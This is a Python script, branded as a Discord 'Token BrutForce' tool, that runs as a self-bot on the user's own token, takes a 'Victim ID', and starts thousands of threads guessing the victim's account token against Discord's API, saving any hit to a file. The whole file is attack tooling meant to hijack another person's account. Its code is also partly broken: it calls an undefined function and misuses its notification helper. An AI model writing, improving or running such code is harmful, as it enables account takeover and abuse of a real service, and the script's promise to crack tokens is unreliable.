import string, discord, os, json, datetime, random, time, base64, ctypes
import requests as req
from threading import Thread as thr
from colorama import Fore
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification

def main():
  ctypes.windll.kernel32.SetConsoleTitleW("Token BrutForce - Made by Astraa")
  brutforce()
  print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter your own account token: """)
  TOKEN = str(input(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Token: """))

  def notifyMe(title, message):
    notification.notify(
      title = title,
      message = message
      )

  class MyClient(discord.Client):
    async def on_ready(self):
      print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Enter the Victim's ID: """)
      userid = input(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Victim ID: """)
      try:
        global user
        user = await client.fetch_user(int(userid))
        stamp = user.created_at
        timestamp = str(time.mktime(stamp.timetuple()))
        encodedBytes = base64.b64encode(userid.encode("utf-8"))
        encodedid = str(encodedBytes, "utf-8")
        encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
        encodedstamp = str(encodedBytes, "utf-8")
        print(f"""\n\n\n\n\n\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Attempting to crack {user}'s token""")
        input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to Valid""")
        os.system('cls')
        time.sleep(1)
        for i in range(10000):
          thr(target = gen, args = (encodedid, encodedstamp)).start()
      except:
        print(f"""      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Your entry is invalid !""")
        time.sleep(2)
        os.system('cls')
        exit(0)

  def gen(encodedid, encodedstamp):
    while True:
      second = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=6))
      end = ('').join(random.choices(string.ascii_letters + string.digits + "-" + "_", k=27))
      token = f"{encodedid}.{second}.{end}"
      headers = {'Content-Type': 'application/json', 'authorization': token}
      url = "https://discordapp.com/api/v6/users/@me/library"
      r = req.get(url, headers=headers)
      if r.status_code == 200:
          print(f'{token} : Valid')
          notifyMe(f"""{Fore.WHITE}[{Fore.GREEN}!{Fore.WHITE}]{Fore.GREEN} VALID TOKEN{Fore.WHITE} : {token}""")
          f = open("temp/BrutForceToken.txt", "a")
          f.write(token)
          f.close() 
          exit(0)
      else:
          print(f"""{Fore.WHITE}[{Fore.RED}!{Fore.WHITE}]{Fore.RED} INVALID TOKEN{Fore.WHITE} : {token}""")

  try:
    token = os.environ.get(TOKEN)
    client = MyClient()
    client.run(TOKEN, bot=False)
  except:
    print(f"""      {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } There is a problem with your Token.""")
    time.sleep(2)
    os.system('cls')
    exit(0)

main()